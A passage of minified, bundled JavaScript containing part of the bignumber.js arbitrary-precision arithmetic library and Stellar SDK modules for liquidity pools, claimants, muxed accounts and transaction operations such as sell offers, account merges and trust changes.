                    Ke = Ke.slice(0, Ke.indexOf("e") + 1) + _e),
                    Qe = new Le(Ke)) : Qe = new Le(we + ""),
                    Qe.c[0]) {
                        for (_e = Qe.e,
                        we = _e + Ce,
                        we < 3 && (we = 0); ; )
                            if (mt = Qe,
                            Qe = st.times(mt.plus(ce(ct, mt, Ce, 1))),
                            fe(mt.c).slice(0, we) === (Ke = fe(Qe.c)).slice(0, we))
                                if (Qe.e < _e && --we,
                                Ke = Ke.slice(we - 3, we + 1),
                                Ke == "9999" || !We && Ke == "4999") {
                                    if (!We && (nt(mt, mt.e + te + 2, 0),
                                    mt.times(mt).eq(ct))) {
                                        Qe = mt;
                                        break
                                    }
                                    Ce += 4,
                                    we += 4,
                                    We = 1
                                } else {
                                    (!+Ke || !+Ke.slice(1) && Ke.charAt(0) == "5") && (nt(Qe, Qe.e + te + 2, 1),
                                    je = !Qe.times(Qe).eq(ct));
                                    break
                                }
                    }
                    return nt(Qe, Qe.e + te + 1, se, je)
                }
                ,
                U.times = U.mul = function(je, Ke) {
                    var Qe, We, mt, ct, vt, we, _e, Ce, st, et, tt, He, ke, Me, Ue, rt = this, dt = rt.c, Et = (L = 17,
                    je = new Le(je,Ke)).c;
                    if (!dt || !Et || !dt[0] || !Et[0])
                        return !rt.s || !je.s || dt && !dt[0] && !Et || Et && !Et[0] && !dt ? je.c = je.e = je.s = null : (je.s *= rt.s,
                        !dt || !Et ? je.c = je.e = null : (je.c = [0],
                        je.e = 0)),
                        je;
                    for (We = ue(rt.e / K) + ue(je.e / K),
                    je.s *= rt.s,
                    _e = dt.length,
                    et = Et.length,
                    _e < et && (ke = dt,
                    dt = Et,
                    Et = ke,
                    mt = _e,
                    _e = et,
                    et = mt),
                    mt = _e + et,
                    ke = []; mt--; ke.push(0))
                        ;
                    for (Me = V,
                    Ue = ae,
                    mt = et; --mt >= 0; ) {
                        for (Qe = 0,
                        tt = Et[mt] % Ue,
                        He = Et[mt] / Ue | 0,
                        vt = _e,
                        ct = mt + vt; ct > mt; )
                            Ce = dt[--vt] % Ue,
                            st = dt[vt] / Ue | 0,
                            we = He * Ce + st * tt,
                            Ce = tt * Ce + we % Ue * Ue + ke[ct] + Qe,
                            Qe = (Ce / Me | 0) + (we / Ue | 0) + He * st,
                            ke[ct--] = Ce % Me;
                        ke[ct] = Qe
                    }
                    return Qe ? ++We : ke.splice(0, 1),
                    Ve(je, ke, We)
                }
                ,
                U.toDigits = function(je, Ke) {
                    var Qe = new Le(this);
                    return je = je == null || !ge(je, 1, ne, 18, "precision") ? null : je | 0,
                    Ke = Ke == null || !ge(Ke, 0, 8, 18, X) ? se : Ke | 0,
                    je ? nt(Qe, je, Ke) : Qe
                }
                ,
                U.toExponential = function(je, Ke) {
                    return $e(this, je != null && ge(je, 0, ne, 19) ? ~~je + 1 : null, Ke, 19)
                }
                ,
                U.toFixed = function(je, Ke) {
                    return $e(this, je != null && ge(je, 0, ne, 20) ? ~~je + this.e + 1 : null, Ke, 20)
                }
                ,
                U.toFormat = function(je, Ke) {
                    var Qe = $e(this, je != null && ge(je, 0, ne, 21) ? ~~je + this.e + 1 : null, Ke, 21);
                    if (this.c) {
                        var We, mt = Qe.split("."), ct = +Te.groupSize, vt = +Te.secondaryGroupSize, we = Te.groupSeparator, _e = mt[0], Ce = mt[1], st = this.s < 0, et = st ? _e.slice(1) : _e, tt = et.length;
                        if (vt && (We = ct,
                        ct = vt,
                        vt = We,
                        tt -= We),
                        ct > 0 && tt > 0) {
                            for (We = tt % ct || ct,
                            _e = et.substr(0, We); We < tt; We += ct)
                                _e += we + et.substr(We, ct);
                            vt > 0 && (_e += we + et.slice(We)),
                            st && (_e = "-" + _e)
                        }
                        Qe = Ce ? _e + Te.decimalSeparator + ((vt = +Te.fractionGroupSize) ? Ce.replace(new RegExp("\\d{" + vt + "}\\B","g"), "$&" + Te.fractionGroupSeparator) : Ce) : _e
                    }
                    return Qe
                }
                ,
                U.toFraction = function(je) {
                    var Ke, Qe, We, mt, ct, vt, we, _e, Ce, st = ve, et = this, tt = et.c, He = new Le(Z), ke = Qe = new Le(Z), Me = we = new Le(Z);
                    if (je != null && (ve = !1,
                    vt = new Le(je),
                    ve = st,
                    (!(st = vt.isInt()) || vt.lt(Z)) && (ve && lt(22, "max denominator " + (st ? "out of range" : "not an integer"), je),
                    je = !st && vt.c && nt(vt, vt.e + 1, 1).gte(Z) ? vt : null)),
                    !tt)
                        return et.toString();
                    for (Ce = fe(tt),
                    mt = He.e = Ce.length - et.e - 1,
                    He.c[0] = ee[(ct = mt % K) < 0 ? K + ct : ct],
                    je = !je || vt.cmp(He) > 0 ? mt > 0 ? He : ke : vt,
                    ct = ie,
                    ie = 1 / 0,
                    vt = new Le(Ce),
                    we.c[0] = 0; _e = ce(vt, He, 0, 1),
                    We = Qe.plus(_e.times(Me)),
                    We.cmp(je) != 1; )
                        Qe = Me,
                        Me = We,
                        ke = we.plus(_e.times(We = ke)),
                        we = We,
                        He = vt.minus(_e.times(We = He)),
                        vt = We;
                    return We = ce(je.minus(Qe), Me, 0, 1),
                    we = we.plus(We.times(ke)),
                    Qe = Qe.plus(We.times(Me)),
                    we.s = ke.s = et.s,
                    mt *= 2,
                    Ke = ce(ke, Me, mt, se).minus(et).abs().cmp(ce(we, Qe, mt, se).minus(et).abs()) < 1 ? [ke.toString(), Me.toString()] : [we.toString(), Qe.toString()],
                    ie = ct,
                    Ke
                }
                ,
                U.toNumber = function() {
                    return +this
                }
                ,
                U.toPower = U.pow = function(je, Ke) {
                    var Qe, We, mt, ct = w(je < 0 ? -je : +je), vt = this;
                    if (Ke != null && (L = 23,
                    Ke = new Le(Ke)),
                    !ge(je, -9007199254740991, Q, 23, "exponent") && (!isFinite(je) || ct > Q && (je /= 0) || parseFloat(je) != je && !(je = NaN)) || je == 0)
                        return Qe = Math.pow(+vt, je),
                        new Le(Ke ? Qe % Ke : Qe);
                    for (Ke ? je > 1 && vt.gt(Z) && vt.isInt() && Ke.gt(Z) && Ke.isInt() ? vt = vt.mod(Ke) : (mt = Ke,
                    Ke = null) : Ie && (Qe = x(Ie / K + 2)),
                    We = new Le(Z); ; ) {
                        if (ct % 2) {
                            if (We = We.times(vt),
                            !We.c)
                                break;
                            Qe ? We.c.length > Qe && (We.c.length = Qe) : Ke && (We = We.mod(Ke))
                        }
                        if (ct = w(ct / 2),
                        !ct)
                            break;
                        vt = vt.times(vt),
                        Qe ? vt.c && vt.c.length > Qe && (vt.c.length = Qe) : Ke && (vt = vt.mod(Ke))
                    }
                    return Ke ? We : (je < 0 && (We = Z.div(We)),
                    mt ? We.mod(mt) : Qe ? nt(We, Ie, se) : We)
                }
                ,
                U.toPrecision = function(je, Ke) {
                    return $e(this, je != null && ge(je, 1, ne, 24, "precision") ? je | 0 : null, Ke, 24)
                }
                ,
                U.toString = function(je) {
                    var Ke, Qe = this, We = Qe.s, mt = Qe.e;
                    return mt === null ? We ? (Ke = "Infinity",
                    We < 0 && (Ke = "-" + Ke)) : Ke = "NaN" : (Ke = fe(Qe.c),
                    je == null || !ge(je, 2, 64, 25, "base") ? Ke = mt <= de || mt >= re ? xe(Ke, mt) : Ae(Ke, mt) : Ke = Ze(Ae(Ke, mt), je | 0, 10, We),
                    We < 0 && Qe.c[0] && (Ke = "-" + Ke)),
                    Ke
                }
                ,
                U.truncated = U.trunc = function() {
                    return nt(new Le(this), this.e + 1, 1)
                }
                ,
                U.valueOf = U.toJSON = function() {
                    var je, Ke = this, Qe = Ke.e;
                    return Qe === null ? Ke.toString() : (je = fe(Ke.c),
                    je = Qe <= de || Qe >= re ? xe(je, Qe) : Ae(je, Qe),
                    Ke.s < 0 ? "-" + je : je)
                }
                ,
                U.isBigNumber = !0,
                Be != null && Le.config(Be),
                Le
            }
            function ue(Be) {
                var ce = Be | 0;
                return Be > 0 || Be === ce ? ce : ce - 1
            }
            function fe(Be) {
                for (var ce, q, L = 1, U = Be.length, Z = Be[0] + ""; L < U; ) {
                    for (ce = Be[L++] + "",
                    q = K - ce.length; q--; ce = "0" + ce)
                        ;
                    Z += ce
                }
                for (U = Z.length; Z.charCodeAt(--U) === 48; )
                    ;
                return Z.slice(0, U + 1 || 1)
            }
            function he(Be, ce) {
                var q, L, U = Be.c, Z = ce.c, te = Be.s, se = ce.s, de = Be.e, re = ce.e;
                if (!te || !se)
                    return null;
                if (q = U && !U[0],
                L = Z && !Z[0],
                q || L)
                    return q ? L ? 0 : -se : te;
                if (te != se)
                    return te;
                if (q = te < 0,
                L = de == re,
                !U || !Z)
                    return L ? 0 : !U ^ q ? 1 : -1;
                if (!L)
                    return de > re ^ q ? 1 : -1;
                for (se = (de = U.length) < (re = Z.length) ? de : re,
                te = 0; te < se; te++)
                    if (U[te] != Z[te])
                        return U[te] > Z[te] ^ q ? 1 : -1;
                return de == re ? 0 : de > re ^ q ? 1 : -1
            }
            function pe(Be, ce, q) {
                return (Be = Ee(Be)) >= ce && Be <= q
            }
            function ye(Be) {
                return Object.prototype.toString.call(Be) == "[object Array]"
            }
            function be(Be, ce, q) {
                for (var L, U = [0], Z, te = 0, se = Be.length; te < se; ) {
                    for (Z = U.length; Z--; U[Z] *= ce)
                        ;
                    for (U[L = 0] += F.indexOf(Be.charAt(te++)); L < U.length; L++)
                        U[L] > q - 1 && (U[L + 1] == null && (U[L + 1] = 0),
                        U[L + 1] += U[L] / q | 0,
                        U[L] %= q)
                }
                return U.reverse()
            }
            function xe(Be, ce) {
                return (Be.length > 1 ? Be.charAt(0) + "." + Be.slice(1) : Be) + (ce < 0 ? "e" : "e+") + ce
            }
            function Ae(Be, ce) {
                var q, L;
                if (ce < 0) {
                    for (L = "0."; ++ce; L += "0")
                        ;
                    Be = L + Be
                } else if (q = Be.length,
                ++ce > q) {
                    for (L = "0",
                    ce -= q; --ce; L += "0")
                        ;
                    Be += L
                } else
                    ce < q && (Be = Be.slice(0, ce) + "." + Be.slice(ce));
                return Be
            }
            function Ee(Be) {
                return Be = parseFloat(Be),
                Be < 0 ? x(Be) : w(Be)
            }
            j = oe(),
            j.default = j.BigNumber = j,
            _.exports ? _.exports = j : (M || (M = typeof self < "u" ? self : Function("return this")()),
            M.BigNumber = j)
        }
        )(bignumber$3)
    }(bignumber$4)),
    bignumber$4.exports
}
var _isFinite, hasRequired_isFinite;
function require_isFinite() {
    if (hasRequired_isFinite)
        return _isFinite;
    hasRequired_isFinite = 1;
    var _ = require_root()
      , M = _.isFinite;
    function j(O) {
        return typeof O == "number" && M(O)
    }
    return _isFinite = j,
    _isFinite
}
var continued_fraction$1 = {}, hasRequiredContinued_fraction$1;
function requireContinued_fraction$1() {
    if (hasRequiredContinued_fraction$1)
        return continued_fraction$1;
    hasRequiredContinued_fraction$1 = 1,
    Object.defineProperty(continued_fraction$1, "__esModule", {
        value: !0
    });
    var _ = function() {
        function b(X, Y) {
            var F = []
              , V = !0
              , K = !1
              , Q = void 0;
            try {
                for (var ee = X[Symbol.iterator](), ae; !(V = (ae = ee.next()).done) && (F.push(ae.value),
                !(Y && F.length === Y)); V = !0)
                    ;
            } catch (ne) {
                K = !0,
                Q = ne
            } finally {
                try {
                    !V && ee.return && ee.return()
                } finally {
                    if (K)
                        throw Q
                }
            }
            return F
        }
        return function(X, Y) {
            if (Array.isArray(X))
                return X;
            if (Symbol.iterator in Object(X))
                return b(X, Y);
            throw new TypeError("Invalid attempt to destructure non-iterable instance")
        }
    }();
    continued_fraction$1.best_r = w;
    var M = requireBignumber$2()
      , j = O(M);
    function O(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var x = (1 << 31 >>> 0) - 1;
    function w(b) {
        for (var X = new j.default(b), Y = void 0, F = void 0, V = [[new j.default(0), new j.default(1)], [new j.default(1), new j.default(0)]], K = 2; !X.gt(x); ) {
            Y = X.floor(),
            F = X.sub(Y);
            var Q = Y.mul(V[K - 1][0]).add(V[K - 2][0])
              , ee = Y.mul(V[K - 1][1]).add(V[K - 2][1]);
            if (Q.gt(x) || ee.gt(x) || (V.push([Q, ee]),
            F.eq(0)))
                break;
            X = new j.default(1).div(F),
            K += 1
        }
        var ae = _(V[V.length - 1], 2)
          , ne = ae[0]
          , oe = ae[1];
        if (ne.isZero() || oe.isZero())
            throw new Error("Couldn't find approximation");
        return [ne.toNumber(), oe.toNumber()]
    }
    return continued_fraction$1
}
var liquidity_pool_asset$1 = {}, hasRequiredLiquidity_pool_asset$1;
function requireLiquidity_pool_asset$1() {
    if (hasRequiredLiquidity_pool_asset$1)
        return liquidity_pool_asset$1;
    hasRequiredLiquidity_pool_asset$1 = 1,
    Object.defineProperty(liquidity_pool_asset$1, "__esModule", {
        value: !0
    }),
    liquidity_pool_asset$1.LiquidityPoolAsset = void 0;
    var _ = function() {
        function F(V, K) {
            for (var Q = 0; Q < K.length; Q++) {
                var ee = K[Q];
                ee.enumerable = ee.enumerable || !1,
                ee.configurable = !0,
                "value"in ee && (ee.writable = !0),
                Object.defineProperty(V, ee.key, ee)
            }
        }
        return function(V, K, Q) {
            return K && F(V.prototype, K),
            Q && F(V, Q),
            V
        }
    }()
      , M = requireClone()
      , j = X(M)
      , O = requireStellarXdr_generated()
      , x = X(O)
      , w = requireAsset$1()
      , b = requireGet_liquidity_pool_id$1();
    function X(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function Y(F, V) {
        if (!(F instanceof V))
            throw new TypeError("Cannot call a class as a function")
    }
    return liquidity_pool_asset$1.LiquidityPoolAsset = function() {
        function F(V, K, Q) {
            if (Y(this, F),
            !V || !(V instanceof w.Asset))
                throw new Error("assetA is invalid");
            if (!K || !(K instanceof w.Asset))
                throw new Error("assetB is invalid");
            if (w.Asset.compare(V, K) !== -1)
                throw new Error("Assets are not in lexicographic order");
            if (!Q || Q !== b.LiquidityPoolFeeV18)
                throw new Error("fee is invalid");
            this.assetA = V,
            this.assetB = K,
            this.fee = Q
        }
        return _(F, [{
            key: "toXDRObject",
            value: function() {
                var K = new x.default.LiquidityPoolConstantProductParameters({
                    assetA: this.assetA.toXDRObject(),
                    assetB: this.assetB.toXDRObject(),
                    fee: this.fee
                })
                  , Q = new x.default.LiquidityPoolParameters("liquidityPoolConstantProduct",K);
                return new x.default.ChangeTrustAsset("assetTypePoolShare",Q)
            }
        }, {
            key: "getLiquidityPoolParameters",
            value: function() {
                return (0,
                j.default)({
                    assetA: this.assetA,
                    assetB: this.assetB,
                    fee: this.fee
                })
            }
        }, {
            key: "getAssetType",
            value: function() {
                return "liquidity_pool_shares"
            }
        }, {
            key: "equals",
            value: function(K) {
                return this.assetA.equals(K.assetA) && this.assetB.equals(K.assetB) && this.fee === K.fee
            }
        }, {
            key: "toString",
            value: function() {
                var K = (0,
                b.getLiquidityPoolId)("constant_product", this.getLiquidityPoolParameters()).toString("hex");
                return "liquidity_pool:" + K
            }
        }], [{
            key: "fromOperation",
            value: function(K) {
                var Q = K.switch();
                if (Q === x.default.AssetType.assetTypePoolShare()) {
                    var ee = K.liquidityPool().constantProduct();
                    return new this(w.Asset.fromOperation(ee.assetA()),w.Asset.fromOperation(ee.assetB()),ee.fee())
                }
                throw new Error("Invalid asset type: " + Q.name)
            }
        }]),
        F
    }(),
    liquidity_pool_asset$1
}
var claimant$1 = {}, hasRequiredClaimant$1;
function requireClaimant$1() {
    if (hasRequiredClaimant$1)
        return claimant$1;
    hasRequiredClaimant$1 = 1,
    Object.defineProperty(claimant$1, "__esModule", {
        value: !0
    }),
    claimant$1.Claimant = void 0;
    var _ = function() {
        function X(Y, F) {
            for (var V = 0; V < F.length; V++) {
                var K = F[V];
                K.enumerable = K.enumerable || !1,
                K.configurable = !0,
                "value"in K && (K.writable = !0),
                Object.defineProperty(Y, K.key, K)
            }
        }
        return function(Y, F, V) {
            return F && X(Y.prototype, F),
            V && X(Y, V),
            Y
        }
    }()
      , M = requireStellarXdr_generated()
      , j = w(M)
      , O = requireKeypair$1()
      , x = requireStrkey$1();
    function w(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    function b(X, Y) {
        if (!(X instanceof Y))
            throw new TypeError("Cannot call a class as a function")
    }
    return claimant$1.Claimant = function() {
        function X(Y, F) {
            if (b(this, X),
            Y && !x.StrKey.isValidEd25519PublicKey(Y))
                throw new Error("Destination is invalid");
            if (this._destination = Y,
            !F)
                this._predicate = j.default.ClaimPredicate.claimPredicateUnconditional();
            else if (F instanceof j.default.ClaimPredicate)
                this._predicate = F;
            else
                throw new Error("Predicate should be an xdr.ClaimPredicate")
        }
        return _(X, [{
            key: "toXDRObject",
            value: function() {
                var F = new j.default.ClaimantV0({
                    destination: O.Keypair.fromPublicKey(this._destination).xdrAccountId(),
                    predicate: this._predicate
                });
                return j.default.Claimant.claimantTypeV0(F)
            }
        }, {
            key: "destination",
            get: function() {
                return this._destination
            },
            set: function(F) {
                throw new Error("Claimant is immutable")
            }
        }, {
            key: "predicate",
            get: function() {
                return this._predicate
            },
            set: function(F) {
                throw new Error("Claimant is immutable")
            }
        }], [{
            key: "predicateUnconditional",
            value: function() {
                return j.default.ClaimPredicate.claimPredicateUnconditional()
            }
        }, {
            key: "predicateAnd",
            value: function(F, V) {
                if (!(F instanceof j.default.ClaimPredicate))
                    throw new Error("left Predicate should be an xdr.ClaimPredicate");
                if (!(V instanceof j.default.ClaimPredicate))
                    throw new Error("right Predicate should be an xdr.ClaimPredicate");
                return j.default.ClaimPredicate.claimPredicateAnd([F, V])
            }
        }, {
            key: "predicateOr",
            value: function(F, V) {
                if (!(F instanceof j.default.ClaimPredicate))
                    throw new Error("left Predicate should be an xdr.ClaimPredicate");
                if (!(V instanceof j.default.ClaimPredicate))
                    throw new Error("right Predicate should be an xdr.ClaimPredicate");
                return j.default.ClaimPredicate.claimPredicateOr([F, V])
            }
        }, {
            key: "predicateNot",
            value: function(F) {
                if (!(F instanceof j.default.ClaimPredicate))
                    throw new Error("right Predicate should be an xdr.ClaimPredicate");
                return j.default.ClaimPredicate.claimPredicateNot(F)
            }
        }, {
            key: "predicateBeforeAbsoluteTime",
            value: function(F) {
                return j.default.ClaimPredicate.claimPredicateBeforeAbsoluteTime(j.default.Int64.fromString(F))
            }
        }, {
            key: "predicateBeforeRelativeTime",
            value: function(F) {
                return j.default.ClaimPredicate.claimPredicateBeforeRelativeTime(j.default.Int64.fromString(F))
            }
        }, {
            key: "fromXDR",
            value: function(F) {
                var V = void 0;
                switch (F.switch()) {
                case j.default.ClaimantType.claimantTypeV0():
                    return V = F.v0(),
                    new this(x.StrKey.encodeEd25519PublicKey(V.destination().ed25519()),V.predicate());
                default:
                    throw new Error("Invalid claimant type: " + F.switch().name)
                }
            }
        }]),
        X
    }(),
    claimant$1
}
var liquidity_pool_id$1 = {}, hasRequiredLiquidity_pool_id$1;
function requireLiquidity_pool_id$1() {
    if (hasRequiredLiquidity_pool_id$1)
        return liquidity_pool_id$1;
    hasRequiredLiquidity_pool_id$1 = 1,
    Object.defineProperty(liquidity_pool_id$1, "__esModule", {
        value: !0
    }),
    liquidity_pool_id$1.LiquidityPoolId = void 0;
    var _ = function() {
        function X(Y, F) {
            for (var V = 0; V < F.length; V++) {
                var K = F[V];
                K.enumerable = K.enumerable || !1,
                K.configurable = !0,
                "value"in K && (K.writable = !0),
                Object.defineProperty(Y, K.key, K)
            }
        }
        return function(Y, F, V) {
            return F && X(Y.prototype, F),
            V && X(Y, V),
            Y
        }
    }()
      , M = requireClone()
      , j = w(M)
      , O = requireStellarXdr_generated()
      , x = w(O);
    function w(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    function b(X, Y) {
        if (!(X instanceof Y))
            throw new TypeError("Cannot call a class as a function")
    }
    return liquidity_pool_id$1.LiquidityPoolId = function() {
        function X(Y) {
            if (b(this, X),
            !Y)
                throw new Error("liquidityPoolId cannot be empty");
            if (!/^[a-f0-9]{64}$/.test(Y))
                throw new Error("Liquidity pool ID is not a valid hash");
            this.liquidityPoolId = Y
        }
        return _(X, [{
            key: "toXDRObject",
            value: function() {
                var F = x.default.PoolId.fromXDR(this.liquidityPoolId, "hex");
                return new x.default.TrustLineAsset("assetTypePoolShare",F)
            }
        }, {
            key: "getLiquidityPoolId",
            value: function() {
                return (0,
                j.default)(this.liquidityPoolId)
            }
        }, {
            key: "getAssetType",
            value: function() {
                return "liquidity_pool_shares"
            }
        }, {
            key: "equals",
            value: function(F) {
                return this.liquidityPoolId === F.getLiquidityPoolId()
            }
        }, {
            key: "toString",
            value: function() {
                return "liquidity_pool:" + this.liquidityPoolId
            }
        }], [{
            key: "fromOperation",
            value: function(F) {
                var V = F.switch();
                if (V === x.default.AssetType.assetTypePoolShare()) {
                    var K = F.liquidityPoolId().toString("hex");
                    return new this(K)
                }
                throw new Error("Invalid asset type: " + V.name)
            }
        }]),
        X
    }(),
    liquidity_pool_id$1
}
var operations$1 = {}, manage_sell_offer$1 = {}, hasRequiredManage_sell_offer$1;
function requireManage_sell_offer$1() {
    if (hasRequiredManage_sell_offer$1)
        return manage_sell_offer$1;
    hasRequiredManage_sell_offer$1 = 1,
    Object.defineProperty(manage_sell_offer$1, "__esModule", {
        value: !0
    }),
    manage_sell_offer$1.manageSellOffer = b;
    var _ = requireIsUndefined()
      , M = w(_)
      , j = requireLib$4()
      , O = requireStellarXdr_generated()
      , x = w(O);
    function w(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    function b(X) {
        var Y = {};
        if (Y.selling = X.selling.toXDRObject(),
        Y.buying = X.buying.toXDRObject(),
        !this.isValidAmount(X.amount, !0))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (Y.amount = this._toXDRAmount(X.amount),
        (0,
        M.default)(X.price))
            throw new TypeError("price argument is required");
        Y.price = this._toXDRPrice(X.price),
        (0,
        M.default)(X.offerId) ? X.offerId = "0" : X.offerId = X.offerId.toString(),
        Y.offerId = j.Hyper.fromString(X.offerId);
        var F = new x.default.ManageSellOfferOp(Y)
          , V = {};
        return V.body = x.default.OperationBody.manageSellOffer(F),
        this.setSourceAccount(V, X),
        new x.default.Operation(V)
    }
    return manage_sell_offer$1
}
var create_passive_sell_offer$1 = {}, hasRequiredCreate_passive_sell_offer$1;
function requireCreate_passive_sell_offer$1() {
    if (hasRequiredCreate_passive_sell_offer$1)
        return create_passive_sell_offer$1;
    hasRequiredCreate_passive_sell_offer$1 = 1,
    Object.defineProperty(create_passive_sell_offer$1, "__esModule", {
        value: !0
    }),
    create_passive_sell_offer$1.createPassiveSellOffer = w;
    var _ = requireIsUndefined()
      , M = x(_)
      , j = requireStellarXdr_generated()
      , O = x(j);
    function x(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function w(b) {
        var X = {};
        if (X.selling = b.selling.toXDRObject(),
        X.buying = b.buying.toXDRObject(),
        !this.isValidAmount(b.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (X.amount = this._toXDRAmount(b.amount),
        (0,
        M.default)(b.price))
            throw new TypeError("price argument is required");
        X.price = this._toXDRPrice(b.price);
        var Y = new O.default.CreatePassiveSellOfferOp(X)
          , F = {};
        return F.body = O.default.OperationBody.createPassiveSellOffer(Y),
        this.setSourceAccount(F, b),
        new O.default.Operation(F)
    }
    return create_passive_sell_offer$1
}
var account_merge$1 = {}, decode_encode_muxed_account$1 = {}, hasRequiredDecode_encode_muxed_account$1;
function requireDecode_encode_muxed_account$1() {
    if (hasRequiredDecode_encode_muxed_account$1)
        return decode_encode_muxed_account$1;
    hasRequiredDecode_encode_muxed_account$1 = 1,
    Object.defineProperty(decode_encode_muxed_account$1, "__esModule", {
        value: !0
    }),
    decode_encode_muxed_account$1.decodeAddressToMuxedAccount = b,
    decode_encode_muxed_account$1.encodeMuxedAccountToAddress = X,
    decode_encode_muxed_account$1.encodeMuxedAccount = Y;
    var _ = requireIsString()
      , M = w(_)
      , j = requireStellarXdr_generated()
      , O = w(j)
      , x = requireStrkey$1();
    function w(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function b(K, Q) {
        return Q && x.StrKey.isValidMed25519PublicKey(K) ? F(K) : O.default.MuxedAccount.keyTypeEd25519(x.StrKey.decodeEd25519PublicKey(K))
    }
    function X(K, Q) {
        if (K.switch().value === O.default.CryptoKeyType.keyTypeMuxedEd25519().value) {
            if (Q)
                return V(K);
            K = K.med25519()
        }
        return x.StrKey.encodeEd25519PublicKey(K.ed25519())
    }
    function Y(K, Q) {
        if (!x.StrKey.isValidEd25519PublicKey(K))
            throw new Error("address should be a Stellar account ID (G...)");
        if (!(0,
        M.default)(Q))
            throw new Error("id should be a string representing a number (uint64)");
        return O.default.MuxedAccount.keyTypeMuxedEd25519(new O.default.MuxedAccountMed25519({
            id: O.default.Uint64.fromString(Q),
            ed25519: x.StrKey.decodeEd25519PublicKey(K)
        }))
    }
    function F(K) {
        var Q = x.StrKey.decodeMed25519PublicKey(K);
        return O.default.MuxedAccount.keyTypeMuxedEd25519(new O.default.MuxedAccountMed25519({
            id: O.default.Uint64.fromXDR(Q.slice(-8)),
            ed25519: Q.slice(0, -8)
        }))
    }
    function V(K) {
        if (K.switch() === O.default.CryptoKeyType.keyTypeEd25519())
            return X(K);
        var Q = K.med25519();
        return x.StrKey.encodeMed25519PublicKey(Buffer.concat([Q.ed25519(), Q.id().toXDR("raw")]))
    }
    return decode_encode_muxed_account$1
}
var hasRequiredAccount_merge$1;
function requireAccount_merge$1() {
    if (hasRequiredAccount_merge$1)
        return account_merge$1;
    hasRequiredAccount_merge$1 = 1,
    Object.defineProperty(account_merge$1, "__esModule", {
        value: !0
    }),
    account_merge$1.accountMerge = x;
    var _ = requireStellarXdr_generated()
      , M = O(_)
      , j = requireDecode_encode_muxed_account$1();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        var b = {};
        try {
            b.body = M.default.OperationBody.accountMerge((0,
            j.decodeAddressToMuxedAccount)(w.destination, w.withMuxing))
        } catch {
            throw new Error("destination is invalid")
        }
        return this.setSourceAccount(b, w),
        new M.default.Operation(b)
    }
    return account_merge$1
}
var allow_trust$1 = {}, hasRequiredAllow_trust$1;
function requireAllow_trust$1() {
    if (hasRequiredAllow_trust$1)
        return allow_trust$1;
    hasRequiredAllow_trust$1 = 1,
    Object.defineProperty(allow_trust$1, "__esModule", {
        value: !0
    }),
    allow_trust$1.allowTrust = X;
    var _ = requirePadEnd()
      , M = b(_)
      , j = requireStellarXdr_generated()
      , O = b(j)
      , x = requireKeypair$1()
      , w = requireStrkey$1();
    function b(Y) {
        return Y && Y.__esModule ? Y : {
            default: Y
        }
    }
    function X(Y) {
        if (!w.StrKey.isValidEd25519PublicKey(Y.trustor))
            throw new Error("trustor is invalid");
        var F = {};
        if (F.trustor = x.Keypair.fromPublicKey(Y.trustor).xdrAccountId(),
        Y.assetCode.length <= 4) {
            var V = (0,
            M.default)(Y.assetCode, 4, "\0");
            F.asset = O.default.AssetCode.assetTypeCreditAlphanum4(V)
        } else if (Y.assetCode.length <= 12) {
            var K = (0,
            M.default)(Y.assetCode, 12, "\0");
            F.asset = O.default.AssetCode.assetTypeCreditAlphanum12(K)
        } else
            throw new Error("Asset code must be 12 characters at max.");
        typeof Y.authorize == "boolean" ? Y.authorize ? F.authorize = O.default.TrustLineFlags.authorizedFlag().value : F.authorize = 0 : F.authorize = Y.authorize;
        var Q = new O.default.AllowTrustOp(F)
          , ee = {};
        return ee.body = O.default.OperationBody.allowTrust(Q),
        this.setSourceAccount(ee, Y),
        new O.default.Operation(ee)
    }
    return allow_trust$1
}
var bump_sequence$1 = {}, hasRequiredBump_sequence$1;
function requireBump_sequence$1() {
    if (hasRequiredBump_sequence$1)
        return bump_sequence$1;
    hasRequiredBump_sequence$1 = 1,
    Object.defineProperty(bump_sequence$1, "__esModule", {
        value: !0
    }),
    bump_sequence$1.bumpSequence = Y;
    var _ = requireLib$4()
      , M = requireBignumber$2()
      , j = X(M)
      , O = requireIsString()
      , x = X(O)
      , w = requireStellarXdr_generated()
      , b = X(w);
    function X(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function Y(F) {
        var V = {};
        if (!(0,
        x.default)(F.bumpTo))
            throw new Error("bumpTo must be a string");
        try {
            new j.default(F.bumpTo)
        } catch {
            throw new Error("bumpTo must be a stringified number")
        }
        V.bumpTo = _.Hyper.fromString(F.bumpTo);
        var K = new b.default.BumpSequenceOp(V)
          , Q = {};
        return Q.body = b.default.OperationBody.bumpSequence(K),
        this.setSourceAccount(Q, F),
        new b.default.Operation(Q)
    }
    return bump_sequence$1
}
var change_trust$1 = {}, hasRequiredChange_trust$1;
function requireChange_trust$1() {
    if (hasRequiredChange_trust$1)
        return change_trust$1;
    hasRequiredChange_trust$1 = 1,
    Object.defineProperty(change_trust$1, "__esModule", {
        value: !0
    }),
    change_trust$1.changeTrust = K;
    var _ = requireIsUndefined()
      , M = F(_)
      , j = requireLib$4()
      , O = requireBignumber$2()
      , x = F(O)
      , w = requireStellarXdr_generated()
      , b = F(w)
      , X = requireAsset$1()
      , Y = requireLiquidity_pool_asset$1();
    function F(Q) {
        return Q && Q.__esModule ? Q : {
            default: Q
        }
    }
    var V = "9223372036854775807";
    function K(Q) {
        var ee = {};
        if (Q.asset instanceof X.Asset)
            ee.line = Q.asset.toChangeTrustXDRObject();
        else if (Q.asset instanceof Y.LiquidityPoolAsset)
            ee.line = Q.asset.toXDRObject();
        else
            throw new TypeError("asset must be Asset or LiquidityPoolAsset");
        if (!(0,
        M.default)(Q.limit) && !this.isValidAmount(Q.limit, !0))
            throw new TypeError(this.constructAmountRequirementsError("limit"));
        Q.limit ? ee.limit = this._toXDRAmount(Q.limit) : ee.limit = j.Hyper.fromString(new x.default(V).toString()),
        Q.source && (ee.source = Q.source.masterKeypair);
